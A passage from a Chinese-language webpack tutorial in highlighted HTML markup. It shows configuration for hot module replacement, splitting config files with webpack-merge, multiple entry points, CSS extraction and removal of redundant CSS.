class="hljs-string">&#x27;webpack&#x27;</span>);  <span class="hljs-comment">// 这个插件不需要安装，是基于webpack的，需要引入webpack模块</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">HtmlWebpackPlugin</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;html-webpack-plugin&#x27;</span>); <span class="hljs-comment">// 引入HtmlWebpackPlugin插件</span><br><span class="hljs-keyword">const</span> &#123; <span class="hljs-title class_">CleanWebpackPlugin</span> &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;clean-webpack-plugin&#x27;</span>); <span class="hljs-comment">// 引入CleanWebpackPlugin插件</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">entry</span>: path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&quot;/src/index.js&quot;</span>), <span class="hljs-comment">// 入口文件</span><br>  <span class="hljs-attr">output</span>: &#123;<br>    <span class="hljs-attr">path</span>: path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&quot;/dist&quot;</span>), <span class="hljs-comment">// 打包后的文件存放的地方 </span><br>    <span class="hljs-attr">filename</span>: <span class="hljs-string">&quot;bundle.js&quot;</span> <span class="hljs-comment">// 打包后输出文件的文件名</span><br>  &#125;,<br>  <span class="hljs-attr">devServer</span>: &#123;<br>    <span class="hljs-attr">contentBase</span>: path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&quot;dist&quot;</span>),<br>    <span class="hljs-attr">hot</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-attr">port</span>: <span class="hljs-string">&#x27;8080&#x27;</span>,<br>    <span class="hljs-attr">inline</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-attr">open</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-attr">overlay</span>: <span class="hljs-literal">true</span>,<br>  &#125;,<br>  <span class="hljs-attr">devtool</span>: <span class="hljs-string">&#x27;source-map&#x27;</span>, <span class="hljs-comment">// 会生成对于调试的完整的.map文件，但同时也会减慢打包速度</span><br>  <span class="hljs-attr">module</span>: &#123;<br>    <span class="hljs-attr">rules</span>: [<br>      &#123;<br>        <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.css$/</span>,   <span class="hljs-comment">// 正则匹配以.css结尾的文件</span><br>        <span class="hljs-attr">use</span>: [<span class="hljs-string">&#x27;style-loader&#x27;</span>, <span class="hljs-string">&#x27;css-loader&#x27;</span>]  <span class="hljs-comment">// 需要用的loader，一定是这个顺序，因为调用loader是从右往左编译的</span><br>      &#125;,<br>      &#123;<br>        <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.(scss|sass)$/</span>,   <span class="hljs-comment">// 正则匹配以.scss和.sass结尾的文件</span><br>        <span class="hljs-attr">use</span>: [<span class="hljs-string">&#x27;style-loader&#x27;</span>, <span class="hljs-string">&#x27;css-loader&#x27;</span>, <span class="hljs-string">&#x27;sass-loader&#x27;</span>]  <span class="hljs-comment">// 需要用的loader，一定是这个顺序，因为调用loader是从右往左编译的</span><br>      &#125;<br>    ]<br>  &#125;,<br>  <span class="hljs-attr">plugins</span>: [<br>    <span class="hljs-keyword">new</span> webpack.<span class="hljs-title class_">BannerPlugin</span>(<span class="hljs-string">&#x27;版权所有，翻版必究&#x27;</span>),  <span class="hljs-comment">// new一个插件的实例 </span><br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">HtmlWebpackPlugin</span>(&#123;<br>      <span class="hljs-attr">template</span>: path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&quot;/src/index.html&quot;</span>)<span class="hljs-comment">// new一个这个插件的实例，并传入相关的参数</span><br>    &#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">CleanWebpackPlugin</span>(),  <span class="hljs-comment">// 默认删除output中path对应文件</span><br>  ]<br>&#125;<br></code></pre></td></tr></table></figure><p>现在我们每运行一次npm run build后就会发现，webpack会先将dist文件夹删除，然后再生产新的dist文件夹。</p><ol start="4"><li>热更新（HotModuleReplacementPlugin）</li></ol><p><strong>HotModuleReplacementPlugin</strong>是一个很实用的插件，可以在我们修改代码后自动刷新预览效果。</p><p>设置方法：</p><ol><li>devServer配置项中添加 hot：true 参数。</li><li>因为HotModuleReplacementPlugin是webpack模块自带的，所以引入webpack后，在plugins配置项中直接使用即可。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">const</span> webpack = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;webpack&#x27;</span>);  <span class="hljs-comment">// 这个插件不需要安装，是基于webpack的，需要引入webpack模块</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">HtmlWebpackPlugin</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;html-webpack-plugin&#x27;</span>); <span class="hljs-comment">// 引入HtmlWebpackPlugin插件</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">CleanWebpackPlugin</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;clean-webpack-plugin&#x27;</span>); <span class="hljs-comment">// 引入CleanWebpackPlugin插件</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">entry</span>: path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&quot;/src/index.js&quot;</span>), <span class="hljs-comment">// 入口文件</span><br>  <span class="hljs-attr">output</span>: &#123;<br>    <span class="hljs-attr">path</span>: path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&quot;/dist&quot;</span>), <span class="hljs-comment">// 打包后的文件存放的地方 </span><br>    <span class="hljs-attr">filename</span>: <span class="hljs-string">&quot;bundle.js&quot;</span> <span class="hljs-comment">// 打包后输出文件的文件名</span><br>  &#125;,<br>  <span class="hljs-attr">devServer</span>: &#123;<br>    <span class="hljs-attr">contentBase</span>: path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&quot;dist&quot;</span>),<br>    <span class="hljs-attr">hot</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-attr">port</span>: <span class="hljs-string">&#x27;8080&#x27;</span>,<br>    <span class="hljs-attr">inline</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-attr">open</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-attr">overlay</span>: <span class="hljs-literal">true</span>,<br>  &#125;,<br>  <span class="hljs-attr">devtool</span>: <span class="hljs-string">&#x27;source-map&#x27;</span>, <span class="hljs-comment">// 会生成对于调试的完整的.map文件，但同时也会减慢打包速度</span><br>  <span class="hljs-attr">module</span>: &#123;<br>    <span class="hljs-attr">rules</span>: [<br>      &#123;<br>        <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.css$/</span>,   <span class="hljs-comment">// 正则匹配以.css结尾的文件</span><br>        <span class="hljs-attr">use</span>: [<span class="hljs-string">&#x27;style-loader&#x27;</span>, <span class="hljs-string">&#x27;css-loader&#x27;</span>]  <span class="hljs-comment">// 需要用的loader，一定是这个顺序，因为调用loader是从右往左编译的</span><br>      &#125;,<br>      &#123;<br>        <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.(scss|sass)$/</span>,   <span class="hljs-comment">// 正则匹配以.scss和.sass结尾的文件</span><br>        <span class="hljs-attr">use</span>: [<span class="hljs-string">&#x27;style-loader&#x27;</span>, <span class="hljs-string">&#x27;css-loader&#x27;</span>, <span class="hljs-string">&#x27;sass-loader&#x27;</span>]  <span class="hljs-comment">// 需要用的loader，一定是这个顺序，因为调用loader是从右往左编译的</span><br>      &#125;<br>    ]<br>  &#125;,<br>  <span class="hljs-attr">plugins</span>: [<br>    <span class="hljs-keyword">new</span> webpack.<span class="hljs-title class_">BannerPlugin</span>(<span class="hljs-string">&#x27;版权所有，翻版必究&#x27;</span>),  <span class="hljs-comment">// new一个插件的实例 </span><br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">HtmlWebpackPlugin</span>(&#123;<br>      <span class="hljs-attr">template</span>: path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&quot;/src/index.html&quot;</span>)<span class="hljs-comment">// new一个这个插件的实例，并传入相关的参数</span><br>    &#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">CleanWebpackPlugin</span>([<span class="hljs-string">&#x27;dist&#x27;</span>]),  <span class="hljs-comment">// 所要清理的文件夹名称</span><br>    <span class="hljs-keyword">new</span> webpack.<span class="hljs-title class_">HotModuleReplacementPlugin</span>() <span class="hljs-comment">// 热更新插件 </span><br>  ]<br>&#125;复制代码<br></code></pre></td></tr></table></figure><p>npm run dev 启动项目后，我们尝试着修改hello.js的内容，会发现浏览器预览效果会自动刷新</p><h4 id="1-10-项目优化及拓展"><a href="#1-10-项目优化及拓展" class="headerlink" title="1.10 项目优化及拓展"></a>1.10 项目优化及拓展</h4><ol><li>代码分离</li></ol><p>我们的webpack.config.js配置文件，其实也没配置多少东西就这么多了，要是以后增加了更多配置，岂不是看得眼花缭乱，所以最好的方法就是把它拆分，方便管理：</p><p>1、 我们在根目录下新建三个文件，分别为webpack.common.js、webpack.dev.js、webpack.prod.js分别代表公共配置文件、开发环境配置文件、生产环境（指项目上线时的环境）配置文件。</p><p>2、安装一个合并模块插件：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">npm <span class="hljs-keyword">install</span> webpack-merge -D<br></code></pre></td></tr></table></figure><p>3、将webpack.config.js的代码拆分到上述新建的三个文件中，然后把将webpack.config.js文件删除，具体如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> webpack.common.js<br>const path = require(<span class="hljs-string">&#x27;path&#x27;</span>);<br>const webpack = require(<span class="hljs-string">&#x27;webpack&#x27;</span>);  <span class="hljs-regexp">//</span> 这个插件不需要安装，是基于webpack的，需要引入webpack模块<br>const HtmlWebpackPlugin = require(<span class="hljs-string">&#x27;html-webpack-plugin&#x27;</span>); <span class="hljs-regexp">//</span> 引入HtmlWebpackPlugin插件<br>module.exports = &#123;<br>  entry: path.join(__dirname, <span class="hljs-string">&quot;/src/index.js&quot;</span>), <span class="hljs-regexp">//</span> 入口文件<br>  output: &#123;<br>    path: path.join(__dirname, <span class="hljs-string">&quot;/dist&quot;</span>), <span class="hljs-regexp">//</span> 打包后的文件存放的地方 <br>    filename: <span class="hljs-string">&quot;bundle.js&quot;</span> <span class="hljs-regexp">//</span> 打包后输出文件的文件名<br>  &#125;,<br>  module: &#123;<br>    rules: [<br>      &#123;<br>        test: <span class="hljs-regexp">/\.css$/</span>,   <span class="hljs-regexp">//</span> 正则匹配以.css结尾的文件<br>        use: [<span class="hljs-string">&#x27;style-loader&#x27;</span>, <span class="hljs-string">&#x27;css-loader&#x27;</span>]  <span class="hljs-regexp">//</span> 需要用的loader，一定是这个顺序，因为调用loader是从右往左编译的<br>      &#125;,<br>      &#123;<br>        test: <span class="hljs-regexp">/\.(scss|sass)$/</span>,   <span class="hljs-regexp">//</span> 正则匹配以.scss和.sass结尾的文件<br>        use: [<span class="hljs-string">&#x27;style-loader&#x27;</span>, <span class="hljs-string">&#x27;css-loader&#x27;</span>, <span class="hljs-string">&#x27;sass-loader&#x27;</span>]  <span class="hljs-regexp">//</span> 需要用的loader，一定是这个顺序，因为调用loader是从右往左编译的<br>      &#125;<br>    ]<br>  &#125;,<br>  plugins: [<br>    new webpack.BannerPlugin(<span class="hljs-string">&#x27;版权所有，翻版必究&#x27;</span>),  <span class="hljs-regexp">//</span> new一个插件的实例 <br>    new HtmlWebpackPlugin(&#123;<br>      template: path.join(__dirname, <span class="hljs-string">&quot;/src/index.html&quot;</span>)<span class="hljs-regexp">//</span> new一个这个插件的实例，并传入相关的参数<br>    &#125;),<br>    new webpack.HotModuleReplacementPlugin() <span class="hljs-regexp">//</span> 热更新插件 <br>  ]<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// webpack.dev.js</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">path</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">merge</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;webpack-merge&#x27;</span>);  <span class="hljs-comment">// 引入webpack-merge功能模块</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">common</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;./webpack.common.js&#x27;</span>); <span class="hljs-comment">// 引入webpack.common.js</span><br><br>module.exports = <span class="hljs-title function_ invoke__">merge</span>(common, &#123;   // 将webpack.common.js合并到当前文件<br>    <span class="hljs-attr">devServer</span>: &#123;<br>        <span class="hljs-attr">contentBase</span>: path.<span class="hljs-title function_ invoke__">join</span>(__dirname, <span class="hljs-string">&quot;dist&quot;</span>),<br>        <span class="hljs-attr">hot</span>: <span class="hljs-literal">true</span>,<br>        <span class="hljs-attr">port</span>: <span class="hljs-string">&#x27;8080&#x27;</span>,<br>        <span class="hljs-attr">inline</span>: <span class="hljs-literal">true</span>,<br>        <span class="hljs-attr">open</span>: <span class="hljs-literal">true</span>,<br>        <span class="hljs-attr">overlay</span>: <span class="hljs-literal">true</span>,<br>    &#125;,<br>&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// webpack.prod.js</span><br><span class="hljs-keyword">const</span> merge = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;webpack-merge&#x27;</span>);<br><span class="hljs-keyword">const</span> common = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./webpack.common.js&#x27;</span>);<br><span class="hljs-keyword">const</span> &#123; <span class="hljs-title class_">CleanWebpackPlugin</span> &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;clean-webpack-plugin&#x27;</span>); <span class="hljs-comment">// 引入CleanWebpackPlugin插件</span><br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-title function_">merge</span>(common, &#123; <span class="hljs-comment">// 将webpack.common.js合并到当前文件</span><br>    <span class="hljs-attr">devtool</span>: <span class="hljs-string">&#x27;source-map&#x27;</span>,  <span class="hljs-comment">// 会生成对于调试的完整的.map文件，但同时也会减慢打包速度</span><br>    <span class="hljs-attr">plugins</span>: [<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">CleanWebpackPlugin</span>(),  <br>    ]<br>&#125;)<br></code></pre></td></tr></table></figure><p>4、设置package.json的scripts命令</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;scripts&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;build&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;webpack --config webpack.prod.js&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;dev&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;webpack-dev-server --open --config webpack.dev.js&quot;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br></code></pre></td></tr></table></figure><p>我们把build命令改为了webpack –config webpack.prod.js，意思是把打包配置指向webpack.prod.js配置文件，而之前我们只需要使用一个webpack 命令为什么就可以运行了？因为webpack 命令是默认指向webpack.config.js这个文件名称了，现在我们把文件名称改了，所以就需要自定义指向新的文件，dev命令中的指令也同理。</p><p>然后我们运行npm run build 和npm run dev，效果应该和我们分离代码前是一样的。</p><ol start="2"><li>多入口 多出口</li></ol><p>到目前为止我们都是一个入口文件和一个出口文件，要是我不止一个入口文件呢？下面我们来试试：</p><p>在webpack.common.js中的entry入口有三种写法，分别为字符串、数组和对象，平时我们用得比较多的是对象，所以我们把它改为对象的写法，首先我们在src文件夹下新建index2.js文件，名称任意。因为有多个入口，所以肯定得多个出口来进行一一对应了，所以entry和output配置如下：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">entry:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">    index:</span> path.join(__dirname, <span class="hljs-string">&quot;/src/index.js&quot;</span>),<br><span class="hljs-symbol">    index2:</span> path.join(__dirname, <span class="hljs-string">&quot;/src/index2.js&quot;</span>)<br><span class="hljs-punctuation">&#125;</span>,<br><span class="hljs-symbol">output:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">    path:</span> path.join(__dirname, <span class="hljs-string">&quot;/dist&quot;</span>), <span class="hljs-comment">// 打包后的文件存放的地方 </span><br><span class="hljs-symbol">    filename:</span> <span class="hljs-string">&quot;[name].js&quot;</span> <span class="hljs-comment">// 打包后输出文件的文件名</span><br><span class="hljs-punctuation">&#125;</span>,<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// index2.js</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">page2</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">let</span> element = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;div&#x27;</span>);<br>    element.<span class="hljs-property">innerHTML</span> = <span class="hljs-string">&#x27;我是第二个入口文件&#x27;</span>;<br>    <span class="hljs-keyword">return</span> element;<br>&#125;<br><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;root&#x27;</span>).<span class="hljs-title function_">appendChild</span>(<span class="hljs-title function_">page2</span>());<br></code></pre></td></tr></table></figure><p>然后我们运行npm run build打包后发现dist文件夹下会多出index2.js文件，同时index.html也会自动将index2.js引入，然后我们运行npm run dev显示如下：</p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2019/12/24/16f374c31dcc0a82~tplv-t2oaga2asx-zoom-in-crop-mark:3024:0:0:0.awebp" alt="img"></p><ol start="3"><li>分离css</li></ol><p>webpack的理念是把css、js全都打包到一个文件里，但要是我们想把css分离出来该怎么做呢？</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">npm install extract-text-webpack-plugin@<span class="hljs-keyword">next</span> -D  <span class="hljs-regexp">//</span> 加上@<span class="hljs-keyword">next</span>是为了安装最新的，否则会出错<br></code></pre></td></tr></table></figure><p>安装完以上插件后在webpack.common.js文件中引入并使用该插件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> webpack.common.js<br>const path = require(<span class="hljs-string">&#x27;path&#x27;</span>);<br>const webpack = require(<span class="hljs-string">&#x27;webpack&#x27;</span>);  <span class="hljs-regexp">//</span> 这个插件不需要安装，是基于webpack的，需要引入webpack模块<br>const HtmlWebpackPlugin = require(<span class="hljs-string">&#x27;html-webpack-plugin&#x27;</span>); <span class="hljs-regexp">//</span> 引入HtmlWebpackPlugin插件<br>const ExtractTextPlugin = require(<span class="hljs-string">&#x27;extract-text-webpack-plugin&#x27;</span>) <span class="hljs-regexp">//</span>引入分离插件<br>module.exports = &#123;<br>    entry: &#123;<br>        index: path.join(__dirname, <span class="hljs-string">&quot;/src/index.js&quot;</span>),<br>        index2: path.join(__dirname, <span class="hljs-string">&quot;/src/index2.js&quot;</span>)<br>    &#125;,<br>    output: &#123;<br>        path: path.join(__dirname, <span class="hljs-string">&quot;/dist&quot;</span>), <span class="hljs-regexp">//</span> 打包后的文件存放的地方 <br>        filename: <span class="hljs-string">&quot;[name].js&quot;</span> <span class="hljs-regexp">//</span> 打包后输出文件的文件名<br>    &#125;,<br>    module: &#123;<br>        rules: [<br>            &#123;<br>                test: <span class="hljs-regexp">/\.css$/</span>,   <span class="hljs-regexp">//</span> 正则匹配以.css结尾的文件<br>                use: ExtractTextPlugin.extract(&#123;  <span class="hljs-regexp">//</span> 这里我们需要调用分离插件内的extract方法<br>                    fallback: <span class="hljs-string">&#x27;style-loader&#x27;</span>,  <span class="hljs-regexp">//</span> 相当于回滚，经css-loader处理过的css最终再经过style-loader处理<br>                    use: [<span class="hljs-string">&#x27;css-loader&#x27;</span>]<br>                &#125;)<br>            &#125;,<br>            &#123;<br>                test: <span class="hljs-regexp">/\.(scss|sass)$/</span>,   <span class="hljs-regexp">//</span> 正则匹配以.scss和.sass结尾的文件<br>                use: [<span class="hljs-string">&#x27;style-loader&#x27;</span>, <span class="hljs-string">&#x27;css-loader&#x27;</span>, <span class="hljs-string">&#x27;sass-loader&#x27;</span>]  <span class="hljs-regexp">//</span> 需要用的loader，一定是这个顺序，因为调用loader是从右往左编译的<br>            &#125;<br>        ]<br>    &#125;,<br>    plugins: [<br>        new webpack.BannerPlugin(<span class="hljs-string">&#x27;版权所有，翻版必究&#x27;</span>),  <span class="hljs-regexp">//</span> new一个插件的实例 <br>        new HtmlWebpackPlugin(&#123;<br>            template: path.join(__dirname, <span class="hljs-string">&quot;/src/index.html&quot;</span>)<span class="hljs-regexp">//</span> new一个这个插件的实例，并传入相关的参数<br>        &#125;),<br>        new webpack.HotModuleReplacementPlugin(), <span class="hljs-regexp">//</span> 热更新插件<br>        new ExtractTextPlugin(<span class="hljs-string">&#x27;css/index.css&#x27;</span>) <span class="hljs-regexp">//</span> 将css分离到/dist文件夹下的css文件夹中的index.css <br>    ]<br>&#125;<br></code></pre></td></tr></table></figure><p>运行npm run build后会发现dist文件夹下多一个css文件</p><ol start="4"><li>消除冗余的css</li></ol><p>有时候我们css写得多了，可能会不自觉的写重复了一些样式，这就造成了多余的代码，上线前又忘了检查，对于这方面，我们应该尽量去优化它，webpack就有这个功能。</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">npm <span class="hljs-keyword">install</span> purifycss-webpack purify-css glob -D复制代码<br></code></pre></td></tr></table></figure><p>安装完后在webpack.prod.js文件中进行配置，引入purifycss-webpack和glob插件并使用它们</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// webpack.prod.js</span><br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">const</span> merge = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;webpack-merge&#x27;</span>);<br><span class="hljs-keyword">const</span> common = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./webpack.common.js&#x27;</span>);<br><span class="hljs-keyword">const</span> &#123; <span class="hljs-title class_">CleanWebpackPlugin</span> &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;clean-webpack-plugin&#x27;</span>); <span class="hljs-comment">// 引入CleanWebpackPlugin插件</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">PurifyCssWebpack</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;purifycss-webpack&#x27;</span>); <span class="hljs-comment">// 引入PurifyCssWebpack插件</span><br><span class="hljs-keyword">const</span> glob = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;glob&#x27;</span>);  <span class="hljs-comment">// 引入glob模块,用于扫描全部html文件中所引用的css</span><br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-title function_">merge</span>(common, &#123; <span class="hljs-comment">// 将webpack.common.js合并到当前文件</span><br>    <span class="hljs-attr">devtool</span>: <span class="hljs-string">&#x27;source-map&#x27;</span>,  <span class="hljs-comment">// 会生成对于调试的完整的.map文件，但同时也会减慢打包速度</span><br>    <span class="hljs-attr">plugins</span>: [<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">CleanWebpackPlugin</span>(),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">PurifyCssWebpack</span>(&#123;<br>            <span class="hljs-attr">paths</span>: glob.<span class="hljs-title function_">sync</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;src/*.html&#x27;</span>)) <span class="hljs-comment">// 同步扫描所有html文件中所引用的css</span><br>        &#125;)<br>    ]<br>&#125;)复制代码<br></code></pre></td></tr></table></figure><p>我们在index.css文件中增加一些多余的代码试试：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* index.css */</span><br><span class="hljs-selector-tag">body</span> &#123;<br>    <span class="hljs-attribute">background</span>: gray;<br>&#125;<br><br><span class="hljs-comment">/* 冗余css */</span><br><span class="hljs-selector-class">.a</span> &#123;<br>    <span class="hljs-attribute">color</span>: black;<br>    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>;<br>    <span class="hljs-attribute">background</span>: red;<br>&#125;<br><br><span class="hljs-comment">/* 冗余css */</span><br><span class="hljs-selector-class">.b</span> &#123;<br>    <span class="hljs-attribute">height</span>: <span 